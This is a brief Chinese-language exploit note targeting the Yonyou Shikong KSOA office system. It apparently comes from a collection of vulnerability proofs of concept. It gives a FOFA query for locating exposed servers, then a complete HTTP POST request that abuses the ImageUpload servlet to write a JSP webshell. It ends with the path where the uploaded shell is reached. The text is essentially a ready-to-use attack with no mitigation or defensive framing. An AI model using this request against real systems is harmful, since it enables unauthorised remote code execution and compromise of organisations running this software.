## 资产收集：
fofa：app="用友-时空KSOA"
![](/img/ksoa.png)
## 利用方法：
```
POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=poc.jsp HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close

webshell
```
webshell链接地址：`x.x.x.x/pictures/poc.jsp`
![](/img/ksoa_poc.png)